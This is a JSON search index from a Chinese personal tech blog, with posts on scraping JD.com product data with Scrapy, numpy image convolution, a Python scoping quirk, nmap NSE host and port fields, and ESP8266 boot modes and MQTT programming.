    "http:\/\/localhost:1313\/post\/machinelearning\/machine_learning_chart\/": {
        
        "title": "The Current State of Machine Intelligence (from Shivon Zilis)",
            "tags": [ "Machine Learning", ],
    "content": " 看到几张描绘近几年来机器学习领域的行业版图：\n\u0026ldquo;The Current State of Machine Intelligence 3.0\u0026rdquo; published in 2016 by Shivon Zilis\n\u0026ldquo;The current state of machine intelligence 2.0\u0026rdquo; published in 2015 by Shivon Zilis\n\u0026ldquo;The Current State of Machine Intelligence\u0026rdquo; published in 2014 by Shivon Zilis\n", 
    "url": "http:\/\/localhost:1313\/post\/machinelearning\/machine_learning_chart\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/crawl\/": {
        
        "title": "Crawl",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/crawl\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/crawler\/": {
        
        "title": "Crawler",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/crawler\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/scrapy\/": {
        
        "title": "Scrapy",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/scrapy\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E4%BA%AC%E4%B8%9C\/": {
        
        "title": "京东",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E4%BA%AC%E4%B8%9C\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E7%88%AC%E8%99%AB\/": {
        
        "title": "爬虫",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E7%88%AC%E8%99%AB\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/network\/scrapy\/": {
        
        "title": "用scrapy爬取京东商品信息",
            "tags": [ "scrapy",  "爬虫",  "京东",  "crawl", ],
    "content": " scrapy是一个非常著名的爬虫框架，使用这个框架可以非常容易的生成一个网站爬虫程序框架，之后就可以在框架之上方便的进行爬虫的编写。\n进来想要了解一些产品的市场信息，就用scrapy写了个简单的爬虫，写个笔记记录一下。\n安装 使用python环境的话最好通过pip进行安装，这样操作简单方便，直接使用下面的命令即可：\n$ pip install scrapy scrapy框架提供了\u0026rsquo;scrapy\u0026rsquo;命令进行项目的创建及运行管理，所以首先看一下\n$ scrapy --help Scrapy 1.4.0 - no active project Usage: scrapy \u0026lt;command\u0026gt; [options] [args] Available commands: bench Run quick benchmark test fetch Fetch a URL using the Scrapy downloader genspider Generate new spider using pre-defined templates runspider Run a self-contained spider (without creating a project) settings Get settings values shell Interactive scraping console startproject Create new project version Print Scrapy version view Open URL in browser, as seen by Scrapy [ more ] More commands available when run from project directory Use \u0026quot;scrapy \u0026lt;command\u0026gt; -h\u0026quot; to see more info about a command 创建项目 首先使用\u0026rsquo;scrapy startproject\u0026rsquo;创建项目\n$ scrapy startproject crawler New Scrapy project 'crawler', using template directory '/Users/wangq/virtualenv/test/lib/python2.7/site-packages/scrapy/templates/project', created in: /Users/wangq/tmp/crawler You can start your first spider with: cd crawler scrapy genspider example example.com 使用\u0026rsquo;scrapy genspider\u0026rsquo;创建爬虫\n$ cd crawler $ scrapy genspider jd list.jd.com $ ls crawler/spiders/jd.py crawler/spiders/jd.py 到此爬虫的框架就创建好了，爬虫的主要代码需要在jd.py中完成。\n编写爬虫 爬虫代码框架 爬虫的代码主要是在crawler/spiders/jd.py中，打开这个文件看到内容如下：\n# -*- coding: utf-8 -*- import scrapy class JdSpider(scrapy.Spider): name = 'jd' allowed_domains = ['list.jd.com'] start_urls = ['http://list.jd.com/'] def parse(self, response): pass 简单解释下：\nname: 爬虫的名字 allowed_domains: 当时用了OffsiteMiddleware的时候这个配置可以限定爬虫爬取的站点的域名列表 start_urls: 指定爬虫开始运行时的爬取URL 在生成的代码中有一个parse()方法，每当爬虫获取一个新的页面爬去返回数据的时候就把这个数据通过response传递给parse()方法进行内容处理。\n了解要爬取网页的结构 编写爬虫前先了解被爬取网页的结构信息，以及信息提取方法。这次我需要提取的信息主要是商品列表页面中的物品、价格、评论数这些基本信息，使用浏览器开发者功能查看对应的元素。\n分析页面发现需要的条目的class都有\u0026rsquo;j-sku-item\u0026rsquo;属性值，知道这个规律后页就可以使用xpath获取到这个条目的具体内容了。\n通过xpath获取选取的页面元素 每个div的class属性包含\u0026rsquo;j-sku-item\u0026rsquo;的元素可以通过xpath的这条规则来描述\u0026quot;//div[contains(@class, \u0026lsquo;j-sku-item\u0026rsquo;)]\u0026quot;，scrapy的response可以直接支持xpath，那么想要获取这个对应的元素就可以通过这行代码来获取了：\nresponse.xpath(\u0026quot;//div[contains(@class, 'j-sku-item')]\u0026quot;): 获取价格及评论信息 通常的静态内容网站数据都可以使用xpath来获取，但在爬京东的网站过程中发现价格及评论数据不是后端与页面一起处理好之后一起发送过来的，所以这两个信息无法使用xpath获取，但仔细分析网络请求可以发现这些信息是通过两个web调用来获取的，我们可以使用python的requests库来获取。\n获取评论信息的调用： 接下来可以使用curl来尝试获取评论信息的方法，最终发现访问可以通过类似的简化来完成：\nhttps://club.jd.com/comment/productCommentSummaries.action?my=pinglun\u0026amp;referenceIds=959228,1722097,1722101 主要参数是referenceIds，这里可以指定需要获取的sku的列表。获取的代码如下：\ndef get_comments(sku_id_list): \u0026quot;\u0026quot;\u0026quot; url: https://club.jd.com/comment/productCommentSummaries.action?my=pinglun\u0026amp;referenceIds=959228,1722097,1722101\u0026quot; \u0026quot;\u0026quot;\u0026quot; ids = ','.join(sku_id_list) url = \u0026quot;https://club.jd.com/comment/productCommentSummaries.action?my=pinglun\u0026amp;referenceIds=\u0026quot; + ids rsp = requests.get(url) return rsp.json() 获取价格信息的调用： 与获取评论信息类似，最终发现调用的接口可以简化成这个样子：\nhttps://p.3.cn/prices/mgets?skuIds=J_959228%2CJ_1722101%2CJ_2064343 不同之处是每个sku前面加了一个\u0026quot;J_\u0026ldquo;字段。参照获取评论的方法代码如下：\ndef get_prices(sku_id_list): \u0026quot;\u0026quot;\u0026quot; url: https://p.3.cn/prices/mgets?skuIds=J_959228%2CJ_1722101%2CJ_2064343 \u0026quot;\u0026quot;\u0026quot; str_id_list = map(lambda x: \u0026quot;J_\u0026quot;+x, sku_id_list) ids = ','.join(str_id_list) url = \u0026quot;https://p.3.cn/prices/mgets?skuIds=\u0026quot; + ids rsp = requests.get(url) return rsp.json() 分页处理 京东的商品条目很多的时候会分页展示，需要爬虫识别分页信息并自动抓取进行上面的处理。\n首先先找到如何导向下一页的连接：\n获取链接的方式可以通过xpath抓取，把抓取的连接传给scrapy的Request()方法进行新页面的抓取，并指定抓取信息的处理回调即可。代码如下：\nnext_page = response.xpath(\u0026quot;//a[@class='pn-next']/@href\u0026quot;).get() if next_page: yield scrapy.Request(\u0026quot;https://list.jd.com\u0026quot;+next_page, callback=self.parse) 抓取项目进行pipeline处理 每一条被爬取好的信息条目会发给pipeline模块进行处理，因此pipeline可以对数据做很多后期的处理工作，包括但不限于：\n清洗抓起数据 验证抓取的数据 去重 存储数据 这次实践主要用pipeline进行数据的存储处理。默认情况下scrapy使用自带的pipeline进行处理，如果需要进行特殊处理则需要对pipeline进行配置。配置文件是crawler/settings.py。\n# Configure item pipelines # See http://scrapy.readthedocs.org/en/latest/topics/item-pipeline.html ITEM_PIPELINES = { 'crawler.pipelines.CrawlerPipeline': 300, } pipeline的配置通过ITEM_PIPELINES完成，可以指定多个pipeline，这样一个pipeline处理完之后可以交给后面的pipeline处理。每一个pipeline条目有一个0-1000之间的整数参数，这个参数指定了pipeline的执行顺序。\n配置好pipeline之后可以在crawler/pipelines.py中编写代码进行存储处理。默认生成的代码中只包含process_item()方法，但对于需要打开文件或者数据库的场景处理会不太方便，我们可以增加open_spider()和close_spider()方法进行处理，比如\nclass CrawlerPipeline(object): def open_spider(self, spider): self.file = open('result.json', 'w') def close_spider(self, spider): self.file.close() def process_item(self, item, spider): line = json.dumps(dict(item)).decode(\u0026quot;unicode_escape\u0026quot;).encode('utf-8') + '\\n' self.file.write(line) return item 编码问题 前面的process_item()方法中有一行处理编码的代码需要解释一下。在用下面这行代码不进行编码处理的情况下如果直接存储json.dumps()的结果时会存储成人类不能直接阅读的内容。\nline = json.dumps(dict(item)) + '\\n' 如下存储的其中一个条目，会发现\u0026quot;name\u0026quot;变成了\u0026rdquo;\\uXXXX\\uXXXX\u0026quot;的字符串。\n{\u0026quot;sku\u0026quot;: \u0026quot;10391738071\u0026quot;, \u0026quot;category\u0026quot;: \u0026quot;3128\u0026quot;, \u0026quot;vendor\u0026quot;: \u0026quot;138857\u0026quot;, \u0026quot;name\u0026quot;: \u0026quot;\\u98de\\u5229\\u6d66\\uff08PHILIPS\\uff09\\u51c0\\u6c34\\u5668 WP4170/00\\u7eaf\\u6c34\\u673a+WP4100/00\\u524d\\u7f6e\\u8fc7\\u6ee4\\u5668\\u5957\\u88c5\u0026quot;, \u0026quot;price\u0026quot;: 4699.0, \u0026quot;comments\u0026quot;: 4} 原因是因为json.dumps()对于中文字符的处理会进行escape处理，为了存储需要首先进行unescape，就是进行decode(\u0026ldquo;unicode_escape\u0026rdquo;)。处理后的结果变成了utf-8编码，需要注意的是这还不够。如果这行代码写成下面的形式，则会发现些文件的时候无法写入文件。\nline = json.dumps(dict(item)).decode(\u0026quot;unicode_escape\u0026quot;) + '\\n' 产生的错误发生在file.write()中：\nUnicodeEncodeError: 'ascii' codec can't encode characters in position 71-72: ordinal not in range(128) 这是因为直接写入文件时write()会认为所有的数据都是ascii码，但中文情况下显然是不成立的。因此需要对数据进行encode()，参照下面的代码写就没有问题了：\nline = json.dumps(dict(item)).decode(\u0026quot;unicode_escape\u0026quot;).encode('utf-8') + '\\n' 注，有写地方会用sys.setdefaultencoding(\u0026lsquo;utf-8\u0026rsquo;)来进行处理，但是不是万不得已并不推荐这种直接改变全局环境的做法，有可能会让程序产生意料不到的情况。\n数据分析 这次抓取数据主要是分析在各个价格区间的产品用户使用情况，因此可以通过柱状图来展示。横坐标表示价格，用100元为一个区间进行统计。纵坐标显示在这100元的价格范围内的用户评论数量。\n画图使用matplotlib编写，主要的代码逻辑如下：\nPRICE_UNIT = 100 axis_price = range(PRICE_LOWER_RANGE, PRICE_UPPER_RANGE, PRICE_UNIT) axis_comment = [0] * len(axis_price) for item in get_all_sku(category=category): idx = int(item.price/PRICE_UNIT) # 当超过统计价格的上限区间后将结果合并到最高价格范围中 if idx \u0026gt;= len(axis_price): axis_comment[-1] += item.comment else: axis_comment[idx] += item.comment width=0.8*PRICE_UNIT plt.bar(axis_price, axis_comment, width, color='blue', align='edge') plt.show() 绘制结果如下：\n", 
    "url": "http:\/\/localhost:1313\/post\/network\/scrapy\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/pygame\/": {
        
        "title": "Pygame",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/pygame\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C\/": {
        
        "title": "神经网络",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/machinelearning\/neuralnetwork\/neural_network_drive\/": {
        
        "title": "神经网络实践：自动驾驶",
            "tags": [ "NeuralNetwork",  "神经网络",  "pygame",  "numpy", ],
    "content": " 最近学习了下神经网络，于是写了一个开车的小游戏，然后训练了一个6层神经网络自己驾驶练练手。\n代码实现主要用了pygame和numpy，网络有7个输入分别对应小车前面的7个距离探头数据，2个输出进行转向输出。\n", 
    "url": "http:\/\/localhost:1313\/post\/machinelearning\/neuralnetwork\/neural_network_drive\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/cnn\/": {
        
        "title": "CNN",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/cnn\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/convolution\/": {
        
        "title": "Convolution",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/convolution\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E5%8D%B7%E7%A7%AF\/": {
        
        "title": "卷积",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E5%8D%B7%E7%A7%AF\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/cv\/convolution\/": {
        
        "title": "图像卷积实践",
            "tags": [ "卷积",  "convolution",  "numpy", ],
    "content": "最近对图像识别技术很感兴趣，了解到在这个领域中CNN的应用可以比较有效的解决问题，这里对卷积（convolution）相关的知识进行一下记录说明。\n图像卷积是什么？ 将一张图片看作一张像素的矩阵的话，卷积就是把另一个矩阵（卷积核）在这张图片上移动，在移动的过程中取图片上对应大小的矩阵与卷积核进行运算，每次矩阵运算得出的结果保存成一个新的像素，这个过程就是图像的卷积运算。\n卷积的过程可以用下面的示意图展示：\n为什么做卷积？ 一张原始图像包含了大量的噪音信息，这些噪音信息会干扰后续的运算过程。如果将一张图像看作一个输入信号的话，如果找到一种过滤器将噪音信息过滤掉就可以提高后续运算的准确度。卷积就是这么一个过滤器，这个过滤器的正式称呼是卷积核。\n那么这个过滤器可以做些什么呢？其实常见的图像处理软件早已经在使用卷积进行图片处理了，比如图像锐化、模糊、浮雕效果等等\u0026hellip;\n下面收集了一些常用的过滤器，对这张图片处理后可以看一下效果。\n图像边界检测 图像模糊 图像锐化 浮雕 用numpy进行卷积计算 以上的图片使用下面的算法生成，主要使用了numpy的array进行的计算。通过该算法生成的图片效果还不够理想：\n比如锐化及浮雕效果，锐化的边缘有些益处而其他部分亮度有些降低 浮雕的效果感觉也不够明显 程序执行速度有些慢 def convolution(self, kernel): \u0026#34;\u0026#34;\u0026#34; Create a new Image instance by applying the kernel \u0026#34;\u0026#34;\u0026#34; print \u0026#34;Run convolution transform\u0026#34; print \u0026#34;Start: %s\u0026#34; % time.ctime() k_height, k_width = kernel.shape n_width = self.width - k_width + 1 n_height = self.height - k_height + 1 if self.color_space == COLOR_SPACE_BW: new_img_data = np.zeros((n_height, n_width), dtype=self.img.dtype) channel_kernel = kernel elif self.color_space == COLOR_SPACE_RGB: new_img_data = np.zeros((n_height, n_width, 3), dtype=self.img.dtype) channel_kernel = np.zeros((k_height, k_width, 3)) for c in range(3): channel_kernel[:,:,c] = kernel elif self.color_space == COLOR_SPACE_RGBA: # drop the alpha channel new_img_data = np.zeros((n_height, n_width, 3), dtype=self.img.dtype) channel_kernel = np.zeros((k_height, k_width, 3)) for c in range(3): channel_kernel[:,:,c] = kernel else: print \u0026#34;Unknow color space\u0026#34; return None for y in range(n_height): for x in range(n_width): if self.color_space == COLOR_SPACE_RGBA: new_img_data[y][x] = sum(sum(self.img[y:y+k_height, x:x+k_width,:3]*channel_kernel)) else: new_img_data[y][x] = sum(sum(self.img[y:y+k_height, x:x+k_width]*channel_kernel)) imax = np.max(self.img) nmax = np.max(new_img_data) scale = 1.0*imax/nmax print \u0026#34;imax[{0}], nmax[{1}]\u0026#34;.format(imax, nmax) print \u0026#34;Scale:\u0026#34;, scale new_img_data = (new_img_data * scale).astype(self.img.dtype) print \u0026#34;End: %s\u0026#34; % time.ctime() new_image = Image() new_image.load_data(new_img_data) return new_image 完整的程序可以在GitHub上找到。\n", 
    "url": "http:\/\/localhost:1313\/post\/cv\/convolution\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/__main__\/": {
        
        "title": "__Main__",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/__main__\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/python\/python_main_global\/": {
        
        "title": "python中__main__的作用域及变量使用",
            "tags": [ "python",  "作用域",  "__main__", ],
    "content": "今天使用python写一段小程序时发现了一个容易忽略掉的变量作用域的细节。先看一下问题。\n$ cat main_variable.py x = 1 if __name__ == \u0026#34;__main__\u0026#34;: global x x = 2 $ python main_area.py main_area.py:4: SyntaxWarning: name \u0026#39;x\u0026#39; is assigned to before global declaration global x 程序的本来目的是在对全局变量前使用global进行声明，但却引发了SyntaxWarning异常。问题原因其实也很简单，因为虽然使用\u0026rsquo;if name == \u0026ldquo;main\u0026quot;\u0026lsquo;进行判断后再执行，但代码还是处于整个文件的作用域中，因此并不需要使用global进行声明。\n因此程序可以有下面两种改法：\n方法1: $ cat main_variable.py x = 1 if __name__ == \u0026#34;__main__\u0026#34;: x = 2 $ python main_area.py 方法2: $ cat main_variable.py x = 1 def main(): global x x = 2 if __name__ == \u0026#34;__main__\u0026#34;: main() $ python main_area.py 写程序一定要注意细节啊！\n", 
    "url": "http:\/\/localhost:1313\/post\/programming\/python\/python_main_global\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/%E4%BD%9C%E7%94%A8%E5%9F%9F\/": {
        
        "title": "作用域",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/%E4%BD%9C%E7%94%A8%E5%9F%9F\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/nmap\/": {
        
        "title": "Nmap",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/nmap\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/network\/nmap\/": {
        
        "title": "nmap NSE脚本中host\/port的内容",
            "tags": [ "nmap",  "NSE", ],
    "content": "周末写了一个简单的nmap的NSE脚本，其中使用了nmap API中的host,port两个变量，数据结构记录。\nHost\nKey Value registry table: 0x7feae1dc5080 name reason_ttl 0 bin_ip ip 192.168.1.10 reason user-set interface_mtu 0 times table: 0x7feae1d9dbf0 Key Value number 443 reason syn-ack version table: 0x7feae1dfb720 state open reason_ttl 0 service https protocol tcp https://nmap.org/book/nse-api.html\nhttps://nmap.org/docs/nmap-mindmap.pdf\n", 
    "url": "http:\/\/localhost:1313\/post\/network\/nmap\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/nse\/": {
        
        "title": "NSE",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/nse\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/hardware\/8266\/": {
        
        "title": "8266",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/hardware\/8266\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/hardware\/8266\/esp8266_sprint_float\/": {
        
        "title": "esp8266_sprint_float",
            "tags": [],
    "content": "用C语言进行字符串格式化操作的时候经常会使用sprintf/snprintf这两个函数，但这两天在使用Arduino IDE进行8266开发的时候却碰到了一个浮点数字符串打印小问题。\n问题代码\nchar buffer[128]; float num = 1.0; ... memset(buffer, 0, sizeof(buffer)); snprintf(buffer, sizeof(buffer), “%f”, num); Serial.println(buffer); 实际运行并没有按照以往认为的方式将浮点数输出出来\nsnprintf(buffer, sizeof(buffer), \u0026#34;%d.\u0026#34;); ", 
    "url": "http:\/\/localhost:1313\/post\/hardware\/8266\/esp8266_sprint_float\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/arduino\/": {
        
        "title": "Arduino",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/arduino\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/boot-mode\/": {
        
        "title": "Boot Mode",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/boot-mode\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/embeded\/": {
        
        "title": "Embeded",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/embeded\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/hardware\/8266\/esp8266_modes\/": {
        
        "title": "esp8266启动模式 - 如何理解\u0027rst cause:2, boot mode:(3,6)\u0027",
            "tags": [ "ESP8266",  "8266",  "nodeMCU",  "rst cause",  "boot mode",  "Embeded",  "Arduino", ],
    "content": "8266模块启动或者出现问题后重启时会输出类似**\u0026lsquo;rst cause:2, boot mode:(3,6)\u0026rsquo;**的消息，这个模块的启动消息可以看出启动的原因和模式。\nrst cause:2, boot mode:(3,6) \u0026lsquo;rst cause\u0026rsquo; **\u0026lsquo;rst cause\u0026rsquo;**含义如下：\n编号 描述 0 unknown 1 normal boot 2 reset pin 3 software reset 4 watchdog reset \u0026lsquo;boot mode\u0026rsquo; 消息中内容的**\u0026lsquo;boot mode:(x,y)\u0026rsquo;中的\u0026lsquo;x\u0026rsquo;**表示GPIO \u0026lsquo;15/0/2\u0026rsquo; 3个端口的二进制数（有电压为1，没电压为0）。\n启动模式 = ((GPIO15 \u0026lt;\u0026lt; 2) | (GPIO0 \u0026lt;\u0026lt; 1) | GPIO2); 由于模块启动的时候会检查0/2/15端口的状态，理解这个数字的意义需要先了解模块的启动模式。\n启动模式 GPIO15 (MTDO) GPIO0 GPIO2 启动模式 0 0V 0V 0V 无效 1 0V 0V 3.3V Uart bootloader 2 0V 3.3V 0V 无效 3 0V 3.3V 3.3V SPI flash (Boot sketch) 4 3.3V 0V 0V SDIO 5 3.3V 0V 3.3V SDIO 6 3.3V 3.3V 0V SDIO 7 3.3V 3.3V 3.3V SDIO 参考资料 https://github.com/esp8266/Arduino/blob/master/doc/boards.md#adafruit-huzzah-esp8266-esp-12 https://github.com/esp8266/esp8266-wiki/wiki/Boot-Process#esp-boot-modes ", 
    "url": "http:\/\/localhost:1313\/post\/hardware\/8266\/esp8266_modes\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/nodemcu\/": {
        
        "title": "NodeMCU",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/nodemcu\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/nodemcu\/": {
        
        "title": "NodeMCU",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/nodemcu\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/rst-cause\/": {
        
        "title": "Rst Cause",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/rst-cause\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/mqtt\/": {
        
        "title": "MQTT",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/mqtt\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/pubsubclient\/": {
        
        "title": "PubSubClient",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/pubsubclient\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/hardware\/8266\/esp8266_mqtt\/": {
        
        "title": "在ESP 8266 nodeMCU上运行MQTT",
            "tags": [ "ESP8266",  "8266",  "nodeMCU",  "MQTT",  "PubSubClient",  "Embeded",  "Arduino", ],
    "content": "自动接触nodeMCU后发现8266是一个非常好的物联网开发Wi-Fi模块，因此就想把MQTT通讯协议在上面运行起来做些简单的事情。\n开发目标 将nodeMCU作为一个MQTT的客户端运行。 使用PubSubClient这个MQTT协议实现。 程序每次启动后先把将芯片设置到STA模式下，并连接指定的WI-FI路由器。 连接建立好之后连接指定的MQTT服务器，并注册从服务器接收数据的topic，并定期将数据（uptime）发送到服务器端指定的topic上。 上传topic：\u0026ldquo;MAC地址/uplink\u0026rdquo; 接收topic：\u0026ldquo;MAC地址/downlink\u0026rdquo; 当收到downlink消息后把数据进行解析并执行，目前只支持\u0026rsquo;blink\u0026rsquo;命令。该命令可以把芯片上的LED灯按照指定的次数点亮的简单操作。 程序开发 程序启动设置 程序启动的入口为\u0026rsquo;setup()\u0026lsquo;函数，这个函数做几件事情：\n设置LED控制PIN模式 将WI-FI芯片设置到STA运行模式，并连接Wi-Fi路由器 连接MQTT服务器，监听\u0026rsquo;downlink\u0026rsquo;消息 程序片段解析：\nvoid setup() { Serial.begin(BAUD_RATE); pinMode(LED_PIN, OUTPUT); // 设置LED控制端口 WiFi.disconnect(); WiFi.mode(WIFI_STA); // 设置启动为STA模式 WiFi.setAutoConnect(true); WiFi.begin(wifi_ssid, wifi_pwd); // 连接Wi-Fi路由器 Serial.printf(\u0026#34;Connecting to AP(%s), password(%s)\\n\u0026#34;, wifi_ssid, wifi_pwd); while (WL_CONNECTED != WiFi.status()) { Serial.print(\u0026#34;.\u0026#34;); blink(BLINK_SLOWLY); } Serial.printf(\u0026#34;\\nWifi connection is setup!\\n\u0026#34;); Serial.printf(\u0026#34;MAC: %s, IP: %s\\n\u0026#34;, WiFi.macAddress().c_str(), WiFi.localIP().toString().c_str()); while (!setup_mqtt_connection()) { // 连接MQTT服务器 Serial.print(\u0026#34;.\u0026#34;); blink(BLINK_SLOWLY); } } 连接MQTT服务器 这个方法的工作就是建立连接并且注册接收的topic。\nbool setup_mqtt_connection() { char client_id[CLIENT_ID_LEN]; snprintf(client_id, CLIENT_ID_LEN, \u0026#34;%s\u0026#34;, WiFi.macAddress().c_str()); Serial.printf(\u0026#34;Client[%s] is connecting MQTT server!\\n\u0026#34;, client_id); mqtt_connected = mq_client.connect(client_id); // 连接MQTT服务器 if (!mqtt_connected) { Serial.println(\u0026#34;MQTT connection failure\u0026#34;); return false; } mq_client.setCallback(mqtt_callback); // 指定接收downlink消息的处理函数 memset(uplink_topic, 0, TOPIC_LEN); snprintf(uplink_topic, TOPIC_LEN, \u0026#34;%s/uplink\u0026#34;, WiFi.macAddress().c_str()); memset(downlink_topic, 0, TOPIC_LEN); snprintf(downlink_topic, TOPIC_LEN, \u0026#34;%s/downlink\u0026#34;, WiFi.macAddress().c_str()); Serial.printf(\u0026#34;Subscribing to topic: %s\\n\u0026#34;, downlink_topic); mqtt_connected = mq_client.subscribe(downlink_topic); // 注册接收downlink消息 if (!mqtt_connected) { Serial.println(\u0026#34;MQTT connection failure\u0026#34;); return false; } Serial.println(\u0026#34;MQTT connection is setup\u0026#34;); return true; } 接收消息处理 MQTT消息处理函数遵循PubSubClient的接口开发就行了。\nvoid mqtt_callback(char *topic, uint8_t* buffer, unsigned int len) { blink(BLINK_QUICKLY); memset(recv_buffer, 0, RECV_BUFFER_LEN); strncpy(recv_buffer, (char *)buffer, (RECV_BUFFER_LEN\u0026lt;len ? RECV_BUFFER_LEN-1:len)); Serial.printf(\u0026#34;Received [topic:%s]:%s\\n\u0026#34;, topic, (char*)recv_buffer); parse_cmd((char *)recv_buffer); } 但这里需要注意\u0026rsquo;len\u0026rsquo;这个参数的使用细节。\u0026rsquo;len\u0026rsquo;这个参数表明接收到的消息的实际长度，最好在处理函数中将数据复制出来后进行处理。最开始我没有这样处理，结果发现\u0026rsquo;buffer\u0026rsquo;中的数据会包含发出数据的信息，研究了一下源代码发现PubSubClient的发出／接收缓冲区是共用的，而且发出／接收后都不会重置。另外需要注意的是这个缓冲区并不大，默认为MQTT_MAX_PACKET_SIZE(128)个子节 。\nclass PubSubClient { ... uint8_t buffer[MQTT_MAX_PACKET_SIZE]; // PubSubClient中的数据共用缓冲区 主循环 程序主循环的主要任务就是数据周期发送并处理MQTT消息接收\nvoid loop() { // send message every 10 second if (millis() - last_uplink_tick \u0026gt;= UPLINK_INTERVAL) { memset(send_buffer, 0, SEND_BUFFER_LEN); snprintf(send_buffer, SEND_BUFFER_LEN, \u0026#34;Client[%s@%s]: uptime:%ld\u0026#34;, WiFi.macAddress().c_str(), WiFi.localIP().toString().c_str(), millis()); Serial.printf(\u0026#34;Sending: %s\\n\u0026#34;, send_buffer); blink(BLINK_QUICKLY); mq_client.publish(uplink_topic, send_buffer); // 发送数据到MQTT服务器 last_uplink_tick = millis(); } mq_client.loop(); } 使用方法 编译 我使用Arduino IDE进行开发，这是一个蛮不错的开发环境。不熟悉的人可以参考我另外一篇“使用Arduino IDE进行nodeMCU开发”的blog。\n运行 nodeMCU客户端 将程序烧入nodeMCU后每次只要通电程序就会自动运行。启动后程序有以下类似输出。\nConnecting to AP(your_wifi_ssid), password(your_wifi_password) .... Wifi connection is setup! MAC: A0:20:A6:18:47:F1, IP: 192.168.102.102 Client[A0:20:A6:18:47:F1] is connecting MQTT server! Subscribing to topic: A0:20:A6:18:47:F1/downlink MQTT connection is setup\rSending: Client[A0:20:A6:18:47:F1@192.168.102.102]: uptime:21959 \u0026lt;-- 上传数据 Sending: Client[A0:20:A6:18:47:F1@192.168.102.102]: uptime:32036 Sending: Client[A0:20:A6:18:47:F1@192.168.102.102]: uptime:42077 Sending: Client[A0:20:A6:18:47:F1@192.168.102.102]: uptime:52160 Sending: Client[A0:20:A6:18:47:F1@192.168.102.102]: uptime:62233 Received [topic:A0:20:A6:18:47:F1/downlink]:#blink#3# \u0026lt;-- 接收控制命令 Received [topic:A0:20:A6:18:47:F1/downlink]:bli \u0026lt;-- 接收到非法命令 Received unknown command: bli 数据接收端 简单运行可以使用\u0026rsquo;mosquitto_sub\u0026rsquo;。命令可以参照下面的写法，需要用\u0026rsquo;-h\u0026rsquo;指定你的MQTT服务器地址，用\u0026rsquo;-t\u0026rsquo;指定接收的topic，这个topic会在nodeMCU每次运行时在串口输出，nodeMCU的MAC地址也会从串口输出。\nmosquitto_sub -h \u0026#34;your_mqtt_server\u0026#34; -t \u0026#34;MAC_ADDRESS/uplink\u0026#34; 我直接是在MQTT服务器上运行数据接收端，因此我实际运行的命令如下：\n$ mosquitto_sub -t \u0026#34;A0:20:A6:18:47/uplink\u0026#34; 远程控制端 可以使用\u0026rsquo;mosquitto_pub\u0026rsquo;进行远程数据发送实现对nodeMCU的控制。下面的例子可以把LED连续点亮3次。\nmosquitto_pub -h \u0026#34;your_mqtt_server\u0026#34; -t \u0026#34;MAC_ADDRESS/downlink\u0026#34; -m \u0026#34;blink#3\u0026#34; 我也是从MQTT服务器端直接发送的控制数据，因此命令可以这样写：\n$ mosquitto_pub -t \u0026#34;A0:20:A6:18:47:F1/downlink\u0026#34; -m \u0026#34;#blink#3#\u0026#34; Demo Video on 